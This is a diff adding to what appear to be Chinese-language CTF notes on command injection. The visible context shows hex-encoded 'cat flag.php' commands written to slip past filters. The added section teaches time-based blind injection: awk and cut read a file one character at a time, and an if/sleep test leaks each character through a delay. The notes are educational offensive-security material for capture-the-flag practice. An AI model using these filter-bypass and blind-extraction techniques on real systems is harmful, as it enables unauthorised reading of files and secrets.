@@ -189,3 +189,46 @@ $(echo 63617420666c61672e706870| xxd -r -p)
 echo \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70
 
 print \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70
+
+# 7.无回显时间盲注
+
+## 基本命令执行
+
+sleep 
+
+cat awk NR awk逐行获取数据
+
+```shell
+#cat flag.php
+hello
+benben
+#cat flag.php | awk NR==1
+hello
+#cat awk NR==2
+benben
+```
+
+cut -c cut命令逐列获取单个字符
+
+```shell
+#cat flag.php
+hello
+benben
+#cat flag.php | awk NR==1 | cut -c 1
+h
+#cat flag.php | awk NR==1 | cut -c 3
+l
+```
+
+## 盲注
+
+```shell
+#if [ $(cat flag | awk NR==2 |cut -c 1 ) == F];then echo "right";fi
+```
+
+```shell
+#if [ $(cat flag | awk NR==2 |cut -c 1 ) == F];then sleep 1;fi
+```
+
+fi表示结束
+
